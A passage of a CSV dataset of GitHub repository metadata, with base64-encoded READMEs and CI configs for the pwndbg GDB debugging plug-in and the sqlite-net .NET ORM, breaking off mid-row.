name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
bGljIExpY2Vuc2UKYWxvbmcgd2l0aCBOZXRHdWFyZC4gSWYgbm90LCBzZWUg
W2h0dHA6Ly93d3cuZ251Lm9yZy9saWNlbnNlcy9dKGh0dHA6Ly93d3cuZ251
Lm9yZy9saWNlbnNlcy8pLgoKVHJhZGVtYXJrcwotLS0tLS0tLS0tCgoqQW5k
cm9pZCBpcyBhIHRyYWRlbWFyayBvZiBHb29nbGUgSW5jLiBHb29nbGUgUGxh
eSBpcyBhIHRyYWRlbWFyayBvZiBHb29nbGUgSW5jKgo=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'pwndbg',31181767,b'Exploit Development and Reverse Engineering with GDB Made Easy',b'Python',82,2384,,2384,False,b'https://api.github.com/repos/pwndbg/pwndbg/forks',"IyBwd25kYmcgWyFbQnVpbGQgU3RhdHVzXShodHRwczovL3RyYXZpcy1jaS5v
cmcvcHduZGJnL3B3bmRiZy5zdmc/YnJhbmNoPWRldildKGh0dHBzOi8vdHJh
dmlzLWNpLm9yZy9wd25kYmcvcHduZGJnKSBbIVtsaWNlbnNlXShodHRwczov
L2ltZy5zaGllbGRzLmlvL2dpdGh1Yi9saWNlbnNlL21hc2hhcGUvYXBpc3Rh
dHVzLnN2Zz9tYXhBZ2U9MjU5MjAwMCldKGh0dHBzOi8vZ2l0aHViLmNvbS9w
d25kYmcvcHduZGJnL2Jsb2IvZGV2L0xJQ0VOU0UubWQpIFshW1B5MiYzXSho
dHRwczovL2ltZy5zaGllbGRzLmlvL2JhZGdlL1B5dGhvbi0yJTIwJTI2JTIw
My1ncmVlbi5zdmcpXSgpIFshW0lSQ10oaHR0cHM6Ly9pbWcuc2hpZWxkcy5p
by9iYWRnZS9mcmVlbm9kZS0lMjNwd25kYmctcmVkLnN2ZyldKGh0dHBzOi8v
d2ViY2hhdC5mcmVlbm9kZS5uZXQvP2NoYW5uZWxzPSNwd25kYmcpCgpgcHdu
ZGJnYCAoL3BvyopuZGLDpmcvKSBpcyBhIEdEQiBwbHVnLWluIHRoYXQgbWFr
ZXMgZGVidWdnaW5nIHdpdGggR0RCIHN1Y2sgbGVzcywgd2l0aCBhIGZvY3Vz
IG9uIGZlYXR1cmVzIG5lZWRlZCBieSBsb3ctbGV2ZWwgc29mdHdhcmUgZGV2
ZWxvcGVycywgaGFyZHdhcmUgaGFja2VycywgcmV2ZXJzZS1lbmdpbmVlcnMg
YW5kIGV4cGxvaXQgZGV2ZWxvcGVycy4KCkl0IGhhcyBhIGJvYXRsb2FkIG9m
IGZlYXR1cmVzLCBzZWUgW0ZFQVRVUkVTLm1kXShGRUFUVVJFUy5tZCkuCgoj
IyBXaHk/CgpWYW5pbGxhIEdEQiBpcyB0ZXJyaWJsZSB0byB1c2UgZm9yIHJl
dmVyc2UgZW5naW5lZXJpbmcgYW5kIGV4cGxvaXQgZGV2ZWxvcG1lbnQuIFR5
cGluZyBgeC9nMzB4ICRlc3BgIGlzIG5vdCBmdW4sIGFuZCBkb2VzIG5vdCAg
Y29uZmVyIG11Y2ggaW5mb3JtYXRpb24uICBUaGUgeWVhciBpcyAyMDE5IGFu
ZCBHREIgc3RpbGwgbGFja3MgYSBoZXhkdW1wIGNvbW1hbmQhICBHREIncyBz
eW50YXggaXMgYXJjYW5lIGFuZCBkaWZmaWN1bHQgdG8gYXBwcm9hY2guICBX
aW5kYmcgdXNlcnMgYXJlIGNvbXBsZXRlbHkgbG9zdCB3aGVuIHRoZXkgb2Nj
YXNpb25hbGx5IG5lZWQgdG8gYnVtcCBpbnRvIEdEQi4KCiMjIFdoYXQ/CgpQ
d25kYmcgaXMgYSBQeXRob24gbW9kdWxlIHdoaWNoIGlzIGxvYWRlZCBkaXJl
Y3RseSBpbnRvIEdEQiwgYW5kIHByb3ZpZGVzIGEgc3VpdGUgb2YgdXRpbGl0
aWVzIGFuZCBjcnV0Y2hlcyB0byBoYWNrIGFyb3VuZCBhbGwgb2YgdGhlIGNy
dWZ0IHRoYXQgaXMgR0RCIGFuZCBzbW9vdGggb3V0IHRoZSByb3VnaCBlZGdl
cy4KCk1hbnkgb3RoZXIgcHJvamVjdHMgZnJvbSB0aGUgcGFzdCAoZS5nLiwg
W2dkYmluaXRdW2dkYmluaXRdLCBbUEVEQV1bUEVEQV0pIGFuZCBwcmVzZW50
IChlLmcuIFtHRUZdW0dFRl0pIGV4aXN0IHRvIGZpbGwgc29tZSB0aGVzZSBn
YXBzLiAgRWFjaCBwcm92aWRlcyBhbiBleGNlbGxlbnQgZXhwZXJpZW5jZSBh
bmQgZ3JlYXQgZmVhdHVyZXMgLS0gYnV0IHRoZXkncmUgZGlmZmljdWx0IHRv
IGV4dGVuZCAoc29tZSBhcmUgdW5tYWludGFpbmVkLCBhbmQgYWxsIGFyZSBh
IHNpbmdsZSBbMTAwS0JdW2dkYmluaXQyXSwgWzIwMEtCXVtwZWRhLnB5XSwg
b3IgWzMwMEtCXVtnZWYucHldIGZpbGUgKHJlc3BlY3RpdmVseSkpLgoKUHdu
ZGJnIGV4aXN0cyBub3Qgb25seSB0byByZXBsYWNlIGFsbCBvZiBpdHMgcHJl
ZGVjZXNzb3JzLCBidXQgYWxzbyB0byBoYXZlIGEgY2xlYW4gaW1wbGVtZW50
YXRpb24gdGhhdCBydW5zIHF1aWNrbHkgYW5kIGlzIHJlc2lsaWVudCBhZ2Fp
bnN0IGFsbCB0aGUgd2VpcmQgY29ybmVyIGNhc2VzIHRoYXQgY29tZSB1cC4K
CltnZGJpbml0XTogaHR0cHM6Ly9naXRodWIuY29tL2dkYmluaXQvR2RiaW5p
dApbZ2RiaW5pdDJdOiBodHRwczovL2dpdGh1Yi5jb20vZ2RiaW5pdC9HZGJp
bml0L2Jsb2IvbWFzdGVyL2dkYmluaXQKCltQRURBXTogaHR0cHM6Ly9naXRo
dWIuY29tL2xvbmdsZC9wZWRhCltwZWRhLnB5XTogaHR0cHM6Ly9naXRodWIu
Y29tL2xvbmdsZC9wZWRhL2Jsb2IvbWFzdGVyL3BlZGEucHkKCltHRUZdOiBo
dHRwczovL2dpdGh1Yi5jb20vaHVnc3kvZ2VmCltnZWYucHldOiBodHRwczov
L2dpdGh1Yi5jb20vaHVnc3kvZ2VmL2Jsb2IvbWFzdGVyL2dlZi5weQoKIyMg
SG93PwoKSW5zdGFsbGF0aW9uIGlzIHN0cmFpZ2h0Zm9yd2FyZC4gIFB3bmRi
ZyBpcyBiZXN0IHN1cHBvcnRlZCBvbiBVYnVudHUgMTQuMDQgd2l0aCBHREIg
Ny43LCBhbmQgVWJ1bnR1IDE2LjA0IHdpdGggR0RCIDcuMTEuICAKCmBgYHNo
ZWxsCmdpdCBjbG9uZSBodHRwczovL2dpdGh1Yi5jb20vcHduZGJnL3B3bmRi
ZwpjZCBwd25kYmcKLi9zZXR1cC5zaApgYGAKCklmIHlvdSB1c2UgYW55IG90
aGVyIExpbnV4IGRpc3RyaWJ1dGlvbiwgd2UgcmVjb21tZW5kIHVzaW5nIHRo
ZSBsYXRlc3QgYXZhaWxhYmxlIEdEQiBidWlsdCBmcm9tIHNvdXJjZS4gIEJl
IHN1cmUgdG8gcGFzcyBgLS13aXRoLXB5dGhvbj0vcGF0aC90by9weXRob25g
IHRvIGBjb25maWd1cmVgLgoKIyMgV2hhdCBjYW4gSSBkbyB3aXRoIHRoYXQ/
CgpGb3IgZnVydGhlciBpbmZvIGFib3V0IGZlYXR1cmVzL2Z1bmN0aW9uYWxp
dGllcywgc2VlIFtGRUFUVVJFU10oRkVBVFVSRVMubWQpLgoKIyMgV2hvPwoK
UHduZGJnIGlzIGFuIG9wZW4tc291cmNlIHByb2plY3QsIHdyaXR0ZW4gYW5k
IG1haW50YWluZWQgYnkgW21hbnkgY29udHJpYnV0b3JzXShodHRwczovL2dp
dGh1Yi5jb20vcHduZGJnL3B3bmRiZy9ncmFwaHMvY29udHJpYnV0b3JzKSEK
CldhbnQgdG8gaGVscCB3aXRoIGRldmVsb3BtZW50PyBSZWFkIFtDT05UUklC
VVRJTkddKC5naXRodWIvQ09OVFJJQlVUSU5HLm1kKS4KCiMjIENvbnRhY3QK
SWYgeW91IGhhdmUgYW55IHF1ZXN0aW9ucyBub3Qgd29ydGh5IG9mIGEgW2J1
ZyByZXBvcnRdKGh0dHBzOi8vZ2l0aHViLmNvbS9wd25kYmcvcHduZGJnL2lz
c3VlcyksIGZlZWwgZnJlZSB0byBwaW5nCltgZWJlaXA5MGAgb3IgYGRpc2Nv
bm5lY3QzZGAgYXQgI3B3bmRiZyBvbiBGcmVlbm9kZV0oaXJjOi8vaXJjLmZy
ZWVub2RlLm5ldC9wd25kYmcpIGFuZCBhc2sgYXdheS4KQ2xpY2sgW2hlcmVd
KGh0dHBzOi8va2l3aWlyYy5jb20vY2xpZW50L2lyYy5mcmVlbm9kZS5uZXQv
cHduZGJnKSB0byBjb25uZWN0Lgo=
",,"c3VkbzogcmVxdWlyZWQKZGlzdDogdHJ1c3R5Cmxhbmd1YWdlOiBweXRob24K
Y2FjaGU6CiAgICAtIHBpcAogICAgLSBkaXJlY3RvcmllczoKICAgICAgICAt
IC9ob21lL3RyYXZpcy92aXJ0dWFsZW52L3B5dGhvbjIuNy45L2xpYi9weXRo
b24yLjcvc2l0ZS1wYWNrYWdlcy8KICAgICAgICAtIC9ob21lL3RyYXZpcy92
aXJ0dWFsZW52L3B5dGhvbjIuNy45L2Jpbi8KICAgICAgICAtIGNhcHN0b25l
CiAgICAgICAgLSB1bmljb3JuCmluc3RhbGw6CiAgLSBzdWRvIGFwdC1nZXQg
LXkgaW5zdGFsbCBnZGIgbmFzbQogIC0gbHNiX3JlbGVhc2UgLWEKICAtIHBp
cCBpbnN0YWxsIC1yIHJlcXVpcmVtZW50cy50eHQKICAtIHN1ZG8gLi9zZXR1
cC5zaApzY3JpcHQ6CiAgLSBmdXR1cml6ZSAtLWFsbC1pbXBvcnRzIC0tc3Rh
Z2UxIC0tcHJpbnQtZnVuY3Rpb24gLS13cml0ZSAtLXVuaWNvZGUtbGl0ZXJh
bHMgcHduZGJnIHRlc3RzCiAgLSBnaXQgZGlmZi1pbmRleCAtLXF1aWV0IEhF
QUQgLS0gcHduZGJnIHRlc3RzCiAgLSBpc29ydCAtLWNoZWNrLW9ubHkgLS1k
aWZmIC0tcmVjdXJzaXZlIHB3bmRiZyB0ZXN0cwogIC0gUFdOREJHX1RSQVZJ
U19URVNUX1JVTj0xIC4vdGVzdHMuc2gKICAtIHB5dGhvbjIuNyAtbSBweV9j
b21waWxlIGlkYV9zY3JpcHQucHkgJChnaXQgbHMtZmlsZXMgJ3B3bmRiZy8q
LnB5JykKICAtIHB5dGhvbjMgICAtbSBweV9jb21waWxlICAgICAgICAgICAg
ICAgJChnaXQgbHMtZmlsZXMgJ3B3bmRiZy8qLnB5JykK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'sqlite-net',1666245,"b'Simple, powerful, cross-platform SQLite client and ORM for .NET'",b'C#',331,2384,,2384,False,b'https://api.github.com/repos/praeclarum/sqlite-net/forks',"CiMgU1FMaXRlLW5ldAoKWyFbQnVpbGQgU3RhdHVzXShodHRwczovL2FwcC5i
aXRyaXNlLmlvL2FwcC9iZjc1MmMyNmMzMWFlYzZjL3N0YXR1cy5zdmc/dG9r
ZW49cHVVLXlIaE1OZEF3SlV1c205c3dsQSZicmFuY2g9bWFzdGVyKV0oaHR0
cHM6Ly9hcHAuYml0cmlzZS5pby9hcHAvYmY3NTJjMjZjMzFhZWM2YykKClVz
ZSBvbmUgb2YgdGhlc2UgcGFja2FnZXM6Cgp8IFZlcnNpb24gfCBQYWNrYWdl
IHwgRGVzY3JpcHRpb24gfAp8IC0tLS0tLS0gfCAtLS0tLS0tIHwgLS0tLS0t
LS0tLS0gfAp8IFshW051R2V0IFBhY2thZ2VdKGh0dHBzOi8vaW1nLnNoaWVs
ZHMuaW8vbnVnZXQvdi9zcWxpdGUtbmV0LXBjbC5zdmcpXShodHRwczovL3d3
dy5udWdldC5vcmcvcGFja2FnZXMvc3FsaXRlLW5ldC1wY2wpIHwgW3NxbGl0
ZS1uZXQtcGNsXShodHRwczovL3d3dy5udWdldC5vcmcvcGFja2FnZXMvc3Fs
aXRlLW5ldC1wY2wpIHwgLk5FVCBTdGFuZGFyZCBMaWJyYXJ5IHwKfCBbIVtO
dUdldCBQYWNrYWdlIHdpdGggRW5jcnlwdGlvbl0oaHR0cHM6Ly9pbWcuc2hp
ZWxkcy5pby9udWdldC92L3NxbGl0ZS1uZXQtc3FsY2lwaGVyLnN2ZyldKGh0
dHBzOi8vd3d3Lm51Z2V0Lm9yZy9wYWNrYWdlcy9zcWxpdGUtbmV0LXNxbGNp
cGhlcikgfCBbc3FsaXRlLW5ldC1zcWxjaXBoZXJdKGh0dHBzOi8vd3d3Lm51
Z2V0Lm9yZy9wYWNrYWdlcy9zcWxpdGUtbmV0LXNxbGNpcGhlcikgfCBXaXRo
IEVuY3J5cHRpb24gU3VwcG9ydCB8CgpTUUxpdGUtbmV0IGlzIGFuIG9wZW4g
c291cmNlLCBtaW5pbWFsIGxpYnJhcnkgdG8gYWxsb3cgLk5FVCwgLk5FVCBD
b3JlLCBhbmQgTW9ubyBhcHBsaWNhdGlvbnMgdG8gc3RvcmUgZGF0YSBpbgpb
U1FMaXRlIDMgZGF0YWJhc2VzXShodHRwOi8vd3d3LnNxbGl0ZS5vcmcpLiBJ
dCB3YXMgZmlyc3QgZGVzaWduZWQgdG8gd29yayB3aXRoIFtYYW1hcmluLmlP
U10oaHR0cDovL3hhbWFyaW4uY29tKSwKYnV0IGhhcyBzaW5jZSBncm93biB1
cCB0byB3b3JrIG9uIGFsbCB0aGUgcGxhdGZvcm1zIChYYW1hcmluLiosIC5O
RVQsIFVXUCwgQXp1cmUsIGV0Yy4pLgoKU1FMaXRlLW5ldCB3YXMgZGVzaWdu
ZWQgYXMgYSBxdWljayBhbmQgY29udmVuaWVudCBkYXRhYmFzZSBsYXllci4g
SXRzIGRlc2lnbiBmb2xsb3dzIGZyb20gdGhlc2UgKmdvYWxzKjoKCiogVmVy
eSBlYXN5IHRvIGludGVncmF0ZSB3aXRoIGV4aXN0aW5nIHByb2plY3RzIGFu
ZCBydW5zIG9uIGFsbCB0aGUgLk5FVCBwbGF0Zm9ybXMuCiAgCiogVGhpbiB3
cmFwcGVyIG92ZXIgU1FMaXRlIHRoYXQgaXMgZmFzdCBhbmQgZWZmaWNpZW50
LiAoVGhpcyBsaWJyYXJ5IHNob3VsZCBub3QgYmUgdGhlIHBlcmZvcm1hbmNl
IGJvdHRsZW5lY2sgb2YgeW91ciBxdWVyaWVzLikKICAKKiBWZXJ5IHNpbXBs
ZSBtZXRob2RzIGZvciBleGVjdXRpbmcgQ1JVRCBvcGVyYXRpb25zIGFuZCBx
dWVyaWVzIHNhZmVseSAodXNpbmcgcGFyYW1ldGVycykgYW5kIGZvciByZXRy
aWV2aW5nIHRoZSByZXN1bHRzIG9mIHRob3NlIHF1ZXJ5IGluIGEgc3Ryb25n
bHkgdHlwZWQgZmFzaGlvbi4KICAKKiBXb3JrcyB3aXRoIHlvdXIgZGF0YSBt
b2RlbCB3aXRob3V0IGZvcmNpbmcgeW91IHRvIGNoYW5nZSB5b3VyIGNsYXNz
ZXMuIChDb250YWlucyBhIHNtYWxsIHJlZmxlY3Rpb24tZHJpdmVuIE9STSBs
YXllci4pCiAgCiMjIE51R2V0IEluc3RhbGxhdGlvbgoKSW5zdGFsbCBbc3Fs
aXRlLW5ldC1wY2xdKGh0dHBzOi8vd3d3Lm51Z2V0Lm9yZy9wYWNrYWdlcy9z
cWxpdGUtbmV0LXBjbCkgZnJvbSBOdUdldC4KCioqSW1wb3J0YW50OioqIFlv
dSB3aWxsIG5lZWQgdG8gYWRkIHRoZSBOdUdldCBwYWNrYWdlIHRvICoqYm90
aCoqIHlvdXIgKi5ORVQgU3RhbmRhcmQgbGlicmFyeSBwcm9qZWN0KiBhbmQg
eW91ciAqcGxhdGZvcm0tZGVwZW5kZW50IGFwcCBwcm9qZWN0Ki4KCiMjIFNv
dXJjZSBJbnN0YWxsYXRpb24KClNRTGl0ZS1uZXQgaXMgYWxsIGNvbnRhaW5l
ZCBpbiAxIGZpbGUgKEkga25vdywgc28gY29vbCByaWdodD8pIGFuZCBpcyBl
YXN5IHRvIGFkZCB0byB5b3VyIHByb2plY3QuIEp1c3QgYWRkIFtTUUxpdGUu
Y3NdKGh0dHBzOi8vZ2l0aHViLmNvbS9wcmFlY2xhcnVtL3NxbGl0ZS1uZXQv
YmxvYi9tYXN0ZXIvc3JjL1NRTGl0ZS5jcykgdG8geW91ciBwcm9qZWN0LCBh
bmQgeW91J3JlIHJlYWR5IHRvIHN0YXJ0IGNyZWF0aW5nIHRhYmxlcy4gCgoj
IyBQbGVhc2UgQ29udHJpYnV0ZSEKClRoaXMgaXMgYW4gb3BlbiBzb3VyY2Ug
cHJvamVjdCB0aGF0IHdlbGNvbWVzIGNvbnRyaWJ1dGlvbnMvc3VnZ2VzdGlv
bnMvYnVnIHJlcG9ydHMgZnJvbSB0aG9zZSB3aG8gdXNlIGl0LiBJZiB5b3Ug
aGF2ZSBhbnkgaWRlYXMgb24gaG93IHRvIGltcHJvdmUgdGhlIGxpYnJhcnks
IHBsZWFzZSBbcG9zdCBhbiBpc3N1ZSBoZXJlIG9uIEdpdEh1Yl0oaHR0cHM6
Ly9naXRodWIuY29tL3ByYWVjbGFydW0vc3FsaXRlLW5ldC9pc3N1ZXMpLiBQ
bGVhc2UgY2hlY2sgb3V0IHRoZSBbSG93IHRvIENvbnRyaWJ1dGVdKGh0dHBz
Oi8vZ2l0aHViLmNvbS9wcmFlY2xhcnVtL3NxbGl0ZS1uZXQvd2lraS9Ib3ct
dG8tQ29udHJpYnV0ZSkuCgoKIyBFeGFtcGxlIFRpbWUhCgpQbGVhc2UgY29u
c3VsdCB0aGUgV2lraSBmb3IsIGFoZW0sIFtjb21wbGV0ZSBkb2N1bWVudGF0
aW9uXShodHRwczovL2dpdGh1Yi5jb20vcHJhZWNsYXJ1bS9zcWxpdGUtbmV0
L3dpa2kpLgoKVGhlIGxpYnJhcnkgY29udGFpbnMgc2ltcGxlIGF0dHJpYnV0
ZXMgdGhhdCB5b3UgY2FuIHVzZSB0byBjb250cm9sIHRoZSBjb25zdHJ1Y3Rp
b24gb2YgdGFibGVzLiBJbiBhIHNpbXBsZSBzdG9jayBwcm9ncmFtLCB5b3Ug
bWlnaHQgdXNlOgoKYGBgY3NoYXJwCnB1YmxpYyBjbGFzcyBTdG9jawp7Cglb
UHJpbWFyeUtleSwgQXV0b0luY3JlbWVudF0KCXB1YmxpYyBpbnQgSWQgeyBn
ZXQ7IHNldDsgfQoJcHVibGljIHN0cmluZyBTeW1ib2wgeyBnZXQ7IHNldDsg
fQp9CgpwdWJsaWMgY2xhc3MgVmFsdWF0aW9uCnsKCVtQcmltYXJ5S2V5LCBB
dXRvSW5jcmVtZW50XQoJcHVibGljIGludCBJZCB7IGdldDsgc2V0OyB9Cglb
SW5kZXhlZF0KCXB1YmxpYyBpbnQgU3RvY2tJZCB7IGdldDsgc2V0OyB9Cglw
dWJsaWMgRGF0ZVRpbWUgVGltZSB7IGdldDsgc2V0OyB9CglwdWJsaWMgZGVj
aW1hbCBQcmljZSB7IGdldDsgc2V0OyB9Cn0KYGBgCgpPbmNlIHlvdSd2ZSBk
ZWZpbmVkIHRoZSBvYmplY3RzIGluIHlvdXIgbW9kZWwgeW91IGhhdmUgYSBj
aG9pY2Ugb2YgQVBJcy4gWW91IGNhbiB1c2UgdGhlICJzeW5jaHJvbm91cyBB
UEkiIHdoZXJlIGNhbGxzCmJsb2NrIG9uZSBhdCBhIHRpbWUsIG9yIHlvdSBj
YW4gdXNlIHRoZSAiYXN5bmNocm9ub3VzIEFQSSIgd2hlcmUgY2FsbHMgZG8g
bm90IGJsb2NrLiBZb3UgbWF5IGNhcmUgdG8gdXNlIHRoZSBhc3luY2hyb25v
dXMKQVBJIGZvciBtb2JpbGUgYXBwbGljYXRpb25zIGluIG9yZGVyIHRvIGlu
Y3JlYXNlIHJlc3BvbnNpdmVuZXNzLgoKQm90aCBBUElzIGFyZSBleHBsYWlu
ZWQgaW4gdGhlIHR3byBzZWN0aW9ucyBiZWxvdy4KCiMjIFN5bmNocm9ub3Vz
IEFQSQoKT25jZSB5b3UgaGF2ZSBkZWZpbmVkIHlvdXIgZW50aXR5LCB5b3Ug
Y2FuIGF1dG9tYXRpY2FsbHkgZ2VuZXJhdGUgdGFibGVzIGluIHlvdXIgZGF0
YWJhc2UgYnkgY2FsbGluZyBgQ3JlYXRlVGFibGVgOgoKYGBgY3NoYXJwCi8v
IEdldCBhbiBhYnNvbHV0ZSBwYXRoIHRvIHRoZSBkYXRhYmFzZSBmaWxlCnZh
ciBkYXRhYmFzZVBhdGggPSBQYXRoLkNvbWJpbmUoRW52aXJvbm1lbnQuR2V0
Rm9sZGVyUGF0aChFbnZpcm9ubWVudC5TcGVjaWFsRm9sZGVyLk15RG9jdW1l
bnRzKSwgIk15RGF0YS5kYiIpOwoKdmFyIGRiID0gbmV3IFNRTGl0ZUNvbm5l
Y3Rpb24oZGF0YWJhc2VQYXRoKTsKZGIuQ3JlYXRlVGFibGU8U3RvY2s+KCk7
CmRiLkNyZWF0ZVRhYmxlPFZhbHVhdGlvbj4oKTsKYGBgCgpZb3UgY2FuIGlu
c2VydCByb3dzIGluIHRoZSBkYXRhYmFzZSB1c2luZyBgSW5zZXJ0YC4gSWYg
dGhlIHRhYmxlIGNvbnRhaW5zIGFuIGF1dG8taW5jcmVtZW50ZWQgcHJpbWFy
eSBrZXksIHRoZW4gdGhlIHZhbHVlIGZvciB0aGF0IGtleSB3aWxsIGJlIGF2
YWlsYWJsZSB0byB5b3UgYWZ0ZXIgdGhlIGluc2VydDoKCmBgYGNzaGFycApw
dWJsaWMgc3RhdGljIHZvaWQgQWRkU3RvY2soU1FMaXRlQ29ubmVjdGlvbiBk
Yiwgc3RyaW5nIHN5bWJvbCkgewoJdmFyIHN0b2NrID0gbmV3IFN0b2NrKCkg
ewoJCVN5bWJvbCA9IHN5bWJvbAoJfTsKCWRiLkluc2VydChzdG9jayk7CglD
b25zb2xlLldyaXRlTGluZSgiezB9ID09IHsxfSIsIHN0b2NrLlN5bWJvbCwg
c3RvY2suSWQpOwp9CmBgYAoKU2ltaWxhciBtZXRob2RzIGV4aXN0IGZvciBg
VXBkYXRlYCBhbmQgYERlbGV0ZWAuCgpUaGUgbW9zdCBzdHJhaWdodGZvcndh
cmQgd2F5IHRvIHF1ZXJ5IGZvciBkYXRhIGlzIHVzaW5nIHRoZSBgVGFibGVg
IG1ldGhvZC4gVGhpcyBjYW4gdGFrZSBwcmVkaWNhdGVzIGZvciBjb25zdHJh
aW5pbmcgdmlhIFdIRVJFIGNsYXVzZXMgYW5kL29yIGFkZGluZyBPUkRFUiBC
WSBjbGF1c2VzOgoKYGBgY3NoYXJwCnZhciBxdWVyeSA9IGRiLlRhYmxlPFN0
b2NrPigpLldoZXJlKHYgPT4gdi5TeW1ib2wuU3RhcnRzV2l0aCgiQSIpKTsK
CmZvcmVhY2ggKHZhciBzdG9jayBpbiBxdWVyeSkKCUNvbnNvbGUuV3JpdGVM
aW5lKCJTdG9jazogIiArIHN0b2NrLlN5bWJvbCk7CmBgYAoKWW91IGNhbiBh
bHNvIHF1ZXJ5IHRoZSBkYXRhYmFzZSBhdCBhIGxvdy1sZXZlbCB1c2luZyB0
aGUgYFF1ZXJ5YCBtZXRob2Q6CgpgYGBjc2hhcnAKcHVibGljIHN0YXRpYyBJ
RW51bWVyYWJsZTxWYWx1YXRpb24+IFF1ZXJ5VmFsdWF0aW9ucyAoU1FMaXRl
Q29ubmVjdGlvbiBkYiwgU3RvY2sgc3RvY2spIHsKCXJldHVybiBkYi5RdWVy
eTxWYWx1YXRpb24+ICgic2VsZWN0ICogZnJvbSBWYWx1YXRpb24gd2hlcmUg
U3RvY2tJZCA9ID8iLCBzdG9jay5JZCk7Cn0KYGBgCgpUaGUgZ2VuZXJpYyBw
YXJhbWV0ZXIgdG8gdGhlIGBRdWVyeWAgbWV0aG9kIHNwZWNpZmllcyB0aGUg
dHlwZSBvZiBvYmplY3QgdG8gY3JlYXRlIGZvciBlYWNoIHJvdy4gSXQgY2Fu
IGJlIG9uZSBvZiB5b3VyIHRhYmxlIGNsYXNzZXMsIG9yIGFueSBvdGhlciBj
bGFzcyB3aG9zZSBwdWJsaWMgcHJvcGVydGllcyBtYXRjaCB0aGUgY29sdW1u
IHJldHVybmVkIGJ5IHRoZSBxdWVyeS4gRm9yIGluc3RhbmNlLCB3ZSBjb3Vs
ZCByZXdyaXRlIHRoZSBhYm92ZSBxdWVyeSBhczoKCmBgYGNzaGFycApwdWJs
aWMgY2xhc3MgVmFsCnsKCXB1YmxpYyBkZWNpbWFsIE1vbmV5IHsgZ2V0OyBz
ZXQ7IH0KCXB1YmxpYyBEYXRlVGltZSBEYXRlIHsgZ2V0OyBzZXQ7IH0KfQoK
cHVibGljIHN0YXRpYyBJRW51bWVyYWJsZTxWYWw+IFF1ZXJ5VmFscyAoU1FM
aXRlQ29ubmVjdGlvbiBkYiwgU3RvY2sgc3RvY2spIHsKCXJldHVybiBkYi5R
dWVyeTxWYWw+ICgic2VsZWN0IFwiUHJpY2VcIiBhcyBcIk1vbmV5XCIsIFwi
VGltZVwiIGFzIFwiRGF0ZVwiIGZyb20gVmFsdWF0aW9uIHdoZXJlIFN0b2Nr
SWQgPSA/Iiwgc3RvY2suSWQpOwp9CmBgYAoKWW91IGNhbiBwZXJmb3JtIGxv
dy1sZXZlbCB1cGRhdGVzIG9mIHRoZSBkYXRhYmFzZSB1c2luZyB0aGUgYEV4
